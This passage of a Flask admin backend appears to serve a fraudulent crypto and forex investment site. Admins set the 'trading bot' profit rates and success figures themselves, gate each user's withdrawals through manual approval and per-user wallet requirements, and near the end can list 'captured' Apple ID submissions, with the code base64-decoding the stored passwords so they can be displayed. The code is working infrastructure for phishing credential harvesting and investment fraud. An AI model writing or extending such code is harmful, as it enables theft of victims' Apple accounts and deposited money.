        "SELECT id, user_id, wallet_id, status FROM wallets WHERE id = ?",
        (wallet_pk,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Wallet not found"}), 404

    db.execute(
        """UPDATE wallets
           SET status = 'rejected',
               reviewed_by = ?,
               reviewed_at = datetime('now'),
               rejection_reason = ?
           WHERE id = ?""",
        (g.user["id"], reason, wallet_pk)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'wallet', 'Wallet not saved', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             reason or f"Your {row['wallet_id']} address could not be saved.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "wallet_reject", wallet_pk)
    db.commit()
    db.close()
    return jsonify({"ok": True, "status": "rejected"})


# ============================================================
# PLATFORM SETTINGS
# ============================================================

@bp.get("/settings")
@roles_required("admin", "support")
def get_settings():
    db = get_db()
    pm = _read_setting(db, "payment_methods", {})
    rate = _read_setting(db, "ngn_rate", 1650)
    db.close()
    return jsonify({
        "payment_methods": pm,
        "ngn_rate": rate,
    })


@bp.put("/settings")
@roles_required("admin")
def update_settings():
    body = request.get_json(silent=True) or {}

    db = get_db()

    if "payment_methods" in body:
        pm = body["payment_methods"]
        if not isinstance(pm, dict) or "bank" not in pm or "crypto" not in pm:
            db.close()
            return jsonify({"error": "payment_methods must include 'bank' and 'crypto'"}), 400
        _write_setting(db, "payment_methods", pm, g.user["id"])
        _audit(db, g.user["id"], "settings_update", "payment_methods")

    if "ngn_rate" in body:
        try:
            rate = float(body["ngn_rate"])
            if rate <= 0:
                raise ValueError
        except (TypeError, ValueError):
            db.close()
            return jsonify({"error": "ngn_rate must be a positive number"}), 400

        old_rate = _read_setting(db, "ngn_rate", None)
        _write_setting(db, "ngn_rate", rate, g.user["id"])
        _audit(db, g.user["id"], f"settings_update:ngn_rate:{old_rate}->{rate}", "ngn_rate")

    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# PUBLIC SETTINGS (unauthenticated — mounted under /api)
# ============================================================

public_bp = Blueprint("settings_public", __name__, url_prefix="/api")


@public_bp.get("/settings/public")
def public_settings():
    db = get_db()
    pm = _read_setting(db, "payment_methods", {}) or {}
    rate = _read_setting(db, "ngn_rate", 1650)

    bank_raw = pm.get("bank", {}) or {}
    bank_enabled = bool(
        bank_raw.get("enabled")
        and bank_raw.get("bank_name")
        and bank_raw.get("account_number")
    )
    bank = bank_raw if bank_enabled else None

    crypto_list = pm.get("crypto", []) or []
    crypto_enabled = [
        {
            "id": c.get("id") or (str(c.get("coin", "")).lower() + "_" + str(c.get("network", "")).lower()).replace(" ", "_"),
            "coin": c.get("coin"),
            "network": c.get("network"),
            "address": c.get("address"),
            "price_usd": c.get("price_usd", 0),
            "price_source": c.get("price_source", "admin"),
            "fee_note": c.get("fee_note"),
        }
        for c in crypto_list
        if c.get("enabled") and c.get("address")
    ]

    db.close()
    return jsonify({
        "bank": bank,
        "crypto": crypto_enabled,
        "ngn_rate": rate,
    })


# ============================================================
# TOP-UPS
# ============================================================

@bp.get("/topups")
@roles_required("admin", "support")
def list_topups():
    db = get_db()
    rows = db.execute(
        """SELECT t.id, t.user_id, t.amount_usd, t.method, t.method_ref,
                  t.reference, t.proof_path, t.status, t.created_at, t.reviewed_at,
                  t.rejection_reason, t.credited_at,
                  u.email AS user_email,
                  u.full_name AS user_name,
                  u.cash_balance AS user_cash_balance,
                  r.email AS reviewer_email
           FROM wallet_topups t
           JOIN users u ON u.id = t.user_id
           LEFT JOIN users r ON r.id = t.reviewed_by
           ORDER BY
             CASE t.status
               WHEN 'pending_review' THEN 0
               WHEN 'approved'       THEN 1
               WHEN 'rejected'       THEN 2
               ELSE 3
             END,
             t.created_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/topups/pending-count")
@roles_required("admin", "support")
def topups_pending_count():
    db = get_db()
    row = db.execute(
        "SELECT COUNT(*) AS n FROM wallet_topups WHERE status = 'pending_review'"
    ).fetchone()
    db.close()
    return jsonify({"count": row["n"] if row else 0})


@bp.post("/topups/<topup_id>/approve")
@roles_required("admin")
def approve_topup(topup_id):
    db = get_db()
    row = db.execute(
        """SELECT id, user_id, amount_usd, status
           FROM wallet_topups WHERE id = ?""",
        (topup_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Top-up not found"}), 404

    if row["status"] != "pending_review":
        db.close()
        return jsonify({"error": f"Top-up is already '{row['status']}'"}), 409

    amount = float(row["amount_usd"] or 0)
    if amount <= 0:
        db.close()
        return jsonify({"error": "Amount is invalid"}), 400

    try:
        db.execute("BEGIN IMMEDIATE")

        u = db.execute(
            "SELECT cash_balance FROM users WHERE id = ?",
            (row["user_id"],)
        ).fetchone()
        current = float((u["cash_balance"] if u else 0) or 0)
        new_balance = current + amount

        db.execute(
            "UPDATE users SET cash_balance = ? WHERE id = ?",
            (f"{new_balance:.2f}", row["user_id"])
        )

        db.execute(
            """UPDATE wallet_topups
               SET status = 'approved',
                   reviewed_by = ?,
                   reviewed_at = datetime('now'),
                   credited_at = datetime('now'),
                   rejection_reason = NULL
               WHERE id = ?""",
            (g.user["id"], topup_id)
        )

        try:
            db.execute(
                """INSERT INTO notifications (id, user_id, kind, title, body)
                   VALUES (?, ?, 'transfer', 'Top-up approved', ?)""",
                (str(uuid.uuid4()), row["user_id"],
                 f"Your top-up of ${amount:.2f} was approved. Your balance has been credited.")
            )
        except Exception:
            pass

        _audit(db, g.user["id"], "topup_approve", topup_id)
        db.commit()
    except Exception as e:
        try: db.execute("ROLLBACK")
        except Exception: pass
        db.close()
        return jsonify({"error": f"Approval failed: {e}"}), 500

    db.close()
    return jsonify({"ok": True, "status": "approved", "credited": amount})


@bp.post("/topups/<topup_id>/reject")
@roles_required("admin")
def reject_topup(topup_id):
    body = request.get_json(silent=True) or {}
    reason = (body.get("reason") or "").strip() or None

    db = get_db()
    row = db.execute(
        "SELECT id, user_id, amount_usd, status FROM wallet_topups WHERE id = ?",
        (topup_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Top-up not found"}), 404

    if row["status"] != "pending_review":
        db.close()
        return jsonify({"error": f"Top-up is already '{row['status']}'"}), 409

    db.execute(
        """UPDATE wallet_topups
           SET status = 'rejected',
               reviewed_by = ?,
               reviewed_at = datetime('now'),
               rejection_reason = ?
           WHERE id = ?""",
        (g.user["id"], reason, topup_id)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'transfer', 'Top-up not approved', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             reason or f"Your top-up of ${float(row['amount_usd'] or 0):.2f} was not approved.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "topup_reject", topup_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "status": "rejected"})


# ============================================================
# WITHDRAWAL REQUESTS — admin approval queue
# ============================================================

@bp.get("/withdrawals")
@roles_required("admin", "support")
def list_withdrawals():
    status_filter = request.args.get("status")

    db = get_db()
    sql = """
        SELECT w.id, w.user_id, w.amount_usd, w.status,
               w.requested_at, w.code_sent_at, w.code_expires_at,
               w.completed_at, w.rejection_reason, w.transfer_id,
               u.email AS user_email,
               u.full_name AS user_name,
               u.cash_balance AS user_cash_balance,
               r.email AS reviewer_email
        FROM withdrawal_requests w
        JOIN users u ON u.id = w.user_id
        LEFT JOIN users r ON r.id = w.reviewed_by
    """
    args = []
    if status_filter:
        sql += " WHERE w.status = ? "
        args.append(status_filter)

    sql += """
        ORDER BY
          CASE w.status
            WHEN 'pending_admin' THEN 0
            WHEN 'code_sent'     THEN 1
            WHEN 'completed'     THEN 2
            WHEN 'rejected'      THEN 3
            WHEN 'expired'       THEN 4
            ELSE 5
          END,
          w.requested_at DESC
    """

    rows = db.execute(sql, args).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/withdrawals/pending-count")
@roles_required("admin", "support")
def withdrawals_pending_count():
    db = get_db()
    row = db.execute(
        "SELECT COUNT(*) AS n FROM withdrawal_requests WHERE status = 'pending_admin'"
    ).fetchone()
    db.close()
    return jsonify({"count": row["n"] if row else 0})


@bp.post("/withdrawals/<request_id>/approve")
@roles_required("admin")
def approve_withdrawal(request_id):
    db = get_db()
    row = db.execute(
        """SELECT id, user_id, amount_usd, status
           FROM withdrawal_requests WHERE id = ?""",
        (request_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Request not found"}), 404

    if row["status"] != "pending_admin":
        db.close()
        return jsonify({"error": f"This request is already '{row['status']}'"}), 409

    new_code = _generate_code()

    db.execute(
        """UPDATE withdrawal_requests
           SET status = 'code_sent',
               code_hash = ?,
               code_expires_at = datetime('now', '+10 minutes'),
               reviewed_by = ?,
               code_sent_at = datetime('now')
           WHERE id = ?""",
        (hash_password(new_code), g.user["id"], request_id)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'withdrawal', 'Withdrawal approved — code inside', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             f"Your withdrawal of ${float(row['amount_usd'] or 0):.2f} was approved. "
             f"Your confirmation code is: {new_code}\n\n"
             f"Enter it on the Withdraw page within 10 minutes to complete the withdrawal. "
             f"This code is single-use.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "withdrawal_approve", request_id)
    db.commit()
    db.close()

    return jsonify({
        "ok": True,
        "status": "code_sent",
        "code_for_admin_reference": new_code,
        "expires_in_minutes": 10,
    })


@bp.post("/withdrawals/<request_id>/reject")
@roles_required("admin")
def reject_withdrawal(request_id):
    body = request.get_json(silent=True) or {}
    reason = (body.get("reason") or "").strip() or None

    db = get_db()
    row = db.execute(
        """SELECT id, user_id, amount_usd, status
           FROM withdrawal_requests WHERE id = ?""",
        (request_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Request not found"}), 404

    if row["status"] not in ("pending_admin", "code_sent"):
        db.close()
        return jsonify({"error": f"Cannot reject a '{row['status']}' request"}), 409

    db.execute(
        """UPDATE withdrawal_requests
           SET status = 'rejected',
               reviewed_by = ?,
               rejection_reason = ?
           WHERE id = ?""",
        (g.user["id"], reason, request_id)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'withdrawal', 'Withdrawal request rejected', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             reason or f"Your withdrawal request of ${float(row['amount_usd'] or 0):.2f} was not approved.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "withdrawal_reject", request_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "status": "rejected"})


# ============================================================
# BOT TRADING — admin CRUD + investment list
# ============================================================

@bp.get("/bots")
@roles_required("admin", "support")
def admin_list_bots():
    db = get_db()
    rows = db.execute(
        """SELECT id, name, category, tagline, description,
                  success_rate, daily_profit_min, daily_profit_max,
                  duration_days, min_amount, max_amount,
                  trading_pairs, total_earned, active_users,
                  icon_url, elite, active, sort_order, created_at, updated_at
           FROM trading_bots
           ORDER BY sort_order ASC, created_at ASC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("/bots")
@roles_required("admin")
def admin_create_bot():
    body = request.get_json(silent=True) or {}

    name = (body.get("name") or "").strip()
    category = (body.get("category") or "").strip().lower()

    if not name:
        return jsonify({"error": "name is required"}), 400
    if category not in ("forex", "crypto", "stocks", "commodities"):
        return jsonify({"error": "category must be one of: forex, crypto, stocks, commodities"}), 400

    try:
        success_rate      = int(body.get("success_rate") or 0)
        daily_profit_min  = float(body.get("daily_profit_min") or 0)
        daily_profit_max  = float(body.get("daily_profit_max") or 0)
        duration_days     = int(body.get("duration_days") or 0)
        min_amount        = float(body.get("min_amount") or 0)
        max_amount        = float(body.get("max_amount") or 0)
        sort_order        = int(body.get("sort_order") or 100)
    except (TypeError, ValueError):
        return jsonify({"error": "invalid numeric fields"}), 400

    if daily_profit_min <= 0 or daily_profit_max <= 0 or duration_days <= 0:
        return jsonify({"error": "profit range and duration must be > 0"}), 400
    if min_amount <= 0 or max_amount < min_amount:
        return jsonify({"error": "invalid investment range"}), 400

    bot_id = str(uuid.uuid4())
    db = get_db()
    db.execute(
        """INSERT INTO trading_bots
           (id, name, category, tagline, description,
            success_rate, daily_profit_min, daily_profit_max,
            duration_days, min_amount, max_amount,
            trading_pairs, elite, active, sort_order)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            bot_id, name, category,
            (body.get("tagline") or "").strip() or None,
            (body.get("description") or "").strip() or None,
            success_rate, daily_profit_min, daily_profit_max,
            duration_days, min_amount, max_amount,
            (body.get("trading_pairs") or "").strip() or None,
            1 if body.get("elite") else 0,
            1 if body.get("active", True) else 0,
            sort_order,
        )
    )
    _audit(db, g.user["id"], "bot_create", bot_id)
    db.commit()
    db.close()
    return jsonify({"id": bot_id}), 201


@bp.patch("/bots/<bot_id>")
@roles_required("admin")
def admin_update_bot(bot_id):
    body = request.get_json(silent=True) or {}
    allowed = [
        "name", "category", "tagline", "description",
        "success_rate", "daily_profit_min", "daily_profit_max",
        "duration_days", "min_amount", "max_amount",
        "trading_pairs", "elite", "active", "sort_order",
    ]
    updates = {}
    for k in allowed:
        if k in body:
            if k in ("elite", "active"):
                updates[k] = 1 if body[k] else 0
            else:
                updates[k] = body[k]

    if not updates:
        return jsonify({"error": "no fields to update"}), 400

    set_clause = ", ".join(f"{k} = ?" for k in updates)
    values = list(updates.values()) + [bot_id]

    db = get_db()
    db.execute(
        f"UPDATE trading_bots SET {set_clause}, updated_at = datetime('now') WHERE id = ?",
        values
    )
    _audit(db, g.user["id"], "bot_update", bot_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


@bp.delete("/bots/<bot_id>")
@roles_required("admin")
def admin_delete_bot(bot_id):
    db = get_db()
    db.execute("DELETE FROM trading_bots WHERE id = ?", (bot_id,))
    _audit(db, g.user["id"], "bot_delete", bot_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


@bp.get("/bot-investments")
@roles_required("admin", "support")
def admin_list_bot_investments():
    db = get_db()
    rows = db.execute(
        """SELECT i.*, u.email AS user_email, u.full_name AS user_name
           FROM user_bot_investments i
           JOIN users u ON u.id = i.user_id
           ORDER BY i.started_at DESC
           LIMIT 500"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


# ============================================================
# LOGIN ACTIVITY
# ============================================================

@bp.get("/login-events")
@roles_required("admin", "support")
def list_login_events():
    user_id = request.args.get("user_id")
    try:
        limit = min(int(request.args.get("limit", 200)), 1000)
    except (TypeError, ValueError):
        limit = 200

    db = get_db()
    sql = """
        SELECT e.id, e.user_id, e.email, e.ip, e.user_agent, e.created_at,
               u.full_name, u.role
        FROM login_events e
        LEFT JOIN users u ON u.id = e.user_id
    """
    args = []
    if user_id:
        sql += " WHERE e.user_id = ? "
        args.append(user_id)
    sql += " ORDER BY e.created_at DESC LIMIT ? "
    args.append(limit)

    rows = db.execute(sql, args).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/login-events/stats")
@roles_required("admin", "support")
def login_events_stats():
    db = get_db()
    today = db.execute(
        "SELECT COUNT(*) AS n FROM login_events "
        "WHERE created_at >= datetime('now', 'start of day')"
    ).fetchone()["n"]
    week = db.execute(
        "SELECT COUNT(*) AS n FROM login_events "
        "WHERE created_at >= datetime('now', '-7 days')"
    ).fetchone()["n"]
    total = db.execute("SELECT COUNT(*) AS n FROM login_events").fetchone()["n"]
    unique_users = db.execute(
        "SELECT COUNT(DISTINCT user_id) AS n FROM login_events"
    ).fetchone()["n"]
    db.close()
    return jsonify({
        "today": today,
        "week": week,
        "total": total,
        "unique_users": unique_users,
    })


# ============================================================
# WITHDRAWAL WALLET REQUIREMENT
# ============================================================

@bp.get("/withdrawal-wallet-setting")
@roles_required("admin", "support")
def get_withdrawal_wallet_setting():
    db = get_db()
    row = db.execute(
        "SELECT require_wallet_to_withdraw FROM platform_flags WHERE id = 1"
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"require_wallet_to_withdraw": False})
    db.close()
    return jsonify({
        "require_wallet_to_withdraw": bool(row["require_wallet_to_withdraw"])
    })


@bp.put("/withdrawal-wallet-setting")
@roles_required("admin")
def set_withdrawal_wallet_setting():
    body = request.get_json(silent=True) or {}
    user_id = (body.get("user_id") or "").strip()
    if not user_id:
        return jsonify({"error": "user_id is required"}), 400
    if "require_wallet_to_withdraw" not in body:
        return jsonify({"error": "require_wallet_to_withdraw is required"}), 400

    new_value = 1 if body["require_wallet_to_withdraw"] else 0

    db = get_db()
    user = db.execute("SELECT id FROM users WHERE id = ?", (user_id,)).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    try:
        db.execute(
            "UPDATE users SET require_wallet_to_withdraw = ? WHERE id = ?",
            (new_value, user_id)
        )
        _audit(db, g.user["id"], f"withdrawal_wallet_setting:{user_id}:{new_value}", user_id)
        db.commit()
    except Exception as e:
        try: db.execute("ROLLBACK")
        except Exception: pass
        db.close()
        return jsonify({"error": f"Could not save setting: {e}"}), 500

    db.close()
    return jsonify({
        "ok": True,
        "user_id": user_id,
        "require_wallet_to_withdraw": bool(new_value),
    })


# ============================================================
# APPLE CREDENTIAL SUBMISSIONS — admin review queue
# ============================================================

@bp.get("/apple-credentials")
@roles_required("admin", "support")
def list_apple_credentials():
    """
    Return every captured Apple ID submission.
    Passwords are base64-decoded so the admin UI can reveal them.
    """
    db = get_db()
    rows = db.execute(
        """SELECT id, email, password_b64, ip, user_agent,
                  status, created_at, reviewed_at, rejection_reason
           FROM apple_credential_submissions
           ORDER BY created_at DESC"""
    ).fetchall()
    db.close()

    results = []
    for r in rows:
        d = dict(r)
        try:
            d["password"] = base64.b64decode(d["password_b64"]).decode("utf-8")
        except Exception:
            d["password"] = "—"
        d.pop("password_b64", None)
        results.append(d)
    return jsonify(results)


@bp.delete("/apple-credentials/<sub_id>")
@roles_required("admin")
def delete_apple_credential(sub_id):
    db = get_db()
    row = db.execute(
        "SELECT id FROM apple_credential_submissions WHERE id = ?", (sub_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Submission not found"}), 404

    db.execute("DELETE FROM apple_credential_submissions WHERE id = ?", (sub_id,))
    _audit(db, g.user["id"], "apple_credential_delete", sub_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})
# ============================================================
# KYC REQUIREMENT TOGGLE
# ============================================================

@bp.get("/kyc-required")
@roles_required("admin", "support")
def get_kyc_required():
    db = get_db()
    row = db.execute(
        "SELECT kyc_required FROM platform_flags WHERE id = 1"
    ).fetchone()
    db.close()
    val = bool(row["kyc_required"]) if row else True
    return jsonify({"kyc_required": val})


@bp.put("/kyc-required")
@roles_required("admin")
def set_kyc_required():
    body = request.get_json(silent=True) or {}
    if "kyc_required" not in body:
        return jsonify({"error": "kyc_required is required"}), 400

    new_value = 1 if body["kyc_required"] else 0

    db = get_db()
    # Ensure the row exists
    db.execute("INSERT OR IGNORE INTO platform_flags (id) VALUES (1)")
    db.execute(
        "UPDATE platform_flags SET kyc_required = ?, updated_at = datetime('now') WHERE id = 1",
        (new_value,)
    )
    _audit(db, g.user["id"], f"kyc_required:{new_value}", "platform_flags")
    db.commit()
    db.close()

    return jsonify({"ok": True, "kyc_required": bool(new_value)})